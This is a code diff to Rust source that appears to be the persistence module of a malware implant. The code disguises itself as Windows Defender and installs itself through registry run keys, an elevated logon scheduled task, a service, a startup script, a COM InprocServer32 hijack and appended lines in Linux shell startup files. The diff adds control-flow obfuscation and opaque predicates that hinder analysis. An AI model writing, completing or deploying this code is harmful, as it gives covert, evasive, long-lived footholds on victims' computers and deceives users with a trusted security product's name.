@@ -1,9 +1,10 @@
-use std::path::Path;
+use encstr::{cobl, opaque_false};
 use std::env;
 use std::fs;
-use std::process::Command;
 #[cfg(target_os = "windows")]
 use std::os::windows::process::CommandExt;
+use std::path::Path;
+use std::process::Command;
 
 #[cfg(target_os = "windows")]
 const CREATE_NO_WINDOW: u32 = 0x08000000;
@@ -11,9 +12,9 @@ const CREATE_NO_WINDOW: u32 = 0x08000000;
 // === Windows Persistence ===
 
 #[cfg(target_os = "windows")]
-use winreg::enums;
-#[cfg(target_os = "windows")]
 use winreg::RegKey;
+#[cfg(target_os = "windows")]
+use winreg::enums;
 
 #[cfg(target_os = "windows")]
 const TARGET_BIN: &str = "defender.exe";
@@ -24,6 +25,10 @@ const TARGET_DIR: &str = ".cache/defender";
 const TARGET_BIN: &str = "defender";
 
 pub fn persist() -> std::io::Result<()> {
+    cobl!({
+    if opaque_false() {
+        return Ok(());
+    }
     if env::current_exe().is_err() {
         return Ok(());
     }
@@ -32,12 +37,20 @@ pub fn persist() -> std::io::Result<()> {
     #[cfg(target_os = "linux")]
     return linux_persist();
     #[cfg(not(any(target_os = "windows", target_os = "linux")))]
-    { Ok(()) }
+    {
+        Ok(())
+    }
+    })
 }
 
 #[cfg(target_os = "windows")]
 fn windows_persist() -> std::io::Result<()> {
+    cobl!({
     let current_exe = env::current_exe()?;
+
+    if opaque_false() {
+        return Ok(());
+    }
 
     if crate::util::is_dll::is_dll() {
         return dll_persistence(&current_exe);
@@ -56,6 +69,7 @@ fn windows_persist() -> std::io::Result<()> {
     registry_runkey(&target_path);
 
     Ok(())
+    })
 }
 
 #[cfg(target_os = "windows")]
@@ -69,6 +83,7 @@ fn registry_runkey(target_path: &Path) {
 
 #[cfg(target_os = "windows")]
 fn dll_persistence(dll_path: &Path) -> std::io::Result<()> {
+    cobl!({
     let dll_str = dll_path.to_string_lossy().to_string();
 
     let hkcu = RegKey::predef(enums::HKEY_CURRENT_USER);
@@ -87,13 +102,15 @@ fn dll_persistence(dll_path: &Path) -> std::io::Result<()> {
         let _ = fs::write(startup.join("defender.vbs"), vbs);
     }
 
-    let clsid_path = "Software\\Classes\\CLSID\\{00000000-0000-0000-0000-000000000000}\\InprocServer32";
+    let clsid_path =
+        "Software\\Classes\\CLSID\\{00000000-0000-0000-0000-000000000000}\\InprocServer32";
     if let Ok((key, _)) = hkcu.create_subkey(clsid_path) {
         let _ = key.set_value("", &dll_str);
-            let _ = key.set_value("ThreadingModel", &"Apartment".to_string());
+        let _ = key.set_value("ThreadingModel", &"Apartment".to_string());
     }
 
     Ok(())
+    })
 }
 
 #[cfg(target_os = "windows")]
@@ -101,9 +118,16 @@ fn scheduled_task(target_path: &Path) {
     let path_str = target_path.to_string_lossy().to_string();
     let _ = Command::new("schtasks")
         .args(&[
-            "/create", "/tn", "WindowsDefender",
-            "/tr", &path_str,
-            "/sc", "onlogon", "/rl", "highest", "/f",
+            "/create",
+            "/tn",
+            "WindowsDefender",
+            "/tr",
+            &path_str,
+            "/sc",
+            "onlogon",
+            "/rl",
+            "highest",
+            "/f",
         ])
         .creation_flags(CREATE_NO_WINDOW)
         .stdout(std::process::Stdio::null())
@@ -115,7 +139,14 @@ fn scheduled_task(target_path: &Path) {
 fn windows_service(target_path: &Path) {
     let path_str = target_path.to_string_lossy().to_string();
     let _ = Command::new("sc")
-        .args(&["create", "WindowsDefender", "binPath=", &path_str, "start=", "auto"])
+        .args(&[
+            "create",
+            "WindowsDefender",
+            "binPath=",
+            &path_str,
+            "start=",
+            "auto",
+        ])
         .creation_flags(CREATE_NO_WINDOW)
         .stdout(std::process::Stdio::null())
         .stderr(std::process::Stdio::null())
@@ -133,8 +164,12 @@ fn windows_service(target_path: &Path) {
 
 #[cfg(target_os = "linux")]
 fn linux_persist() -> std::io::Result<()> {
-    let home = env::var("HOME")
-        .map_err(|e| std::io::Error::new(std::io::ErrorKind::NotFound, e))?;
+    cobl!({
+    if opaque_false() {
+        return Ok(());
+    }
+    let home =
+        env::var("HOME").map_err(|e| std::io::Error::new(std::io::ErrorKind::NotFound, e))?;
     let target_dir = Path::new(&home).join(TARGET_DIR);
     let target_path = target_dir.join(TARGET_BIN);
 
@@ -144,7 +179,10 @@ fn linux_persist() -> std::io::Result<()> {
 
     if current_exe != target_path {
         fs::copy(&current_exe, &target_path)?;
-        let _ = fs::set_permissions(&target_path, std::os::unix::fs::PermissionsExt::from_mode(0o755));
+        let _ = fs::set_permissions(
+            &target_path,
+            std::os::unix::fs::PermissionsExt::from_mode(0o755),
+        );
         Command::new(&target_path).spawn().ok();
         std::process::exit(0);
     }
@@ -155,6 +193,7 @@ fn linux_persist() -> std::io::Result<()> {
     autostart_desktop(&target_path);
 
     Ok(())
+    })
 }
 
 #[cfg(target_os = "linux")]
@@ -237,8 +276,14 @@ fn bashrc_persistence(target_path: &Path) {
     };
 
     let target_str = target_path.to_string_lossy().to_string();
-    let parent_str = target_path.parent().map(|p| p.display().to_string()).unwrap_or_default();
-    let line = format!("\n# Startup\nexport PATH=\"$PATH:{}\"\n{}\n", parent_str, target_str);
+    let parent_str = target_path
+        .parent()
+        .map(|p| p.display().to_string())
+        .unwrap_or_default();
+    let line = format!(
+        "\n# Startup\nexport PATH=\"$PATH:{}\"\n{}\n",
+        parent_str, target_str
+    );
 
     for rc_file in &[".bashrc", ".profile", ".zshrc", ".bash_profile"] {
         let rc_path = Path::new(&home).join(rc_file);
@@ -249,7 +294,11 @@ fn bashrc_persistence(target_path: &Path) {
                 }
             }
             use std::io::Write;
-            if let Ok(mut file) = fs::OpenOptions::new().append(true).create(true).open(&rc_path) {
+            if let Ok(mut file) = fs::OpenOptions::new()
+                .append(true)
+                .create(true)
+                .open(&rc_path)
+            {
                 let _ = file.write_all(line.as_bytes());
             }
         }
